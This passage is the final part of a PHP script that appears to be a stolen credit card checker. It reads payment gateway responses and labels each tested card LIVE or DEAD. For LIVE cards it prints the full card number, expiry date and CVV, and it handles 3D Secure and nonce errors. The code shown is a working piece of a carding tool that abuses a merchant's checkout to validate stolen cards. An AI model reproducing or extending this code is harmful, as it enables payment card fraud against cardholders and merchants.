  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ 3D SECURE REDIRECT! 🞬";
}

elseif
(strpos($result1, "missing_payment_information")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING PAYMENT INFORMATIONS! 🞬";
}

elseif
(strpos($result1, "Payment cannot be processed, missing credit card number")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING CREDIT CARD NUMBER! 🞬";
}

elseif 
(strpos($result1,  '-1')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ UPDATE NONCE! 🞬 ";
}

elseif
(strpos($result1, "Customer authentication is required to complete this transaction. Please complete the verification steps issued by your payment provider.")) {
  echo "LIVE ⇝ $cc|$mes|$ano|$cvv <br>AUTHENTICATION REQUIRED TO COMPLETE THIS TRANSACTION!  ";
}

elseif
(strpos($result2, "Customer authentication is required to complete this transaction. Please complete the verification steps issued by your payment provider.")) {
  echo "LIVE ⇝ $cc|$mes|$ano|$cvv <br>AUTHENTICATION REQUIRED TO COMPLETE THIS TRANSACTION!  ";
}

elseif 
(strpos($result2,  '-1')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ UPDATE NONCE! 🞬 ";
}

else {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ UNKNOWN ERROR! 🞬";
}

curl_close($ch);
ob_flush();

?>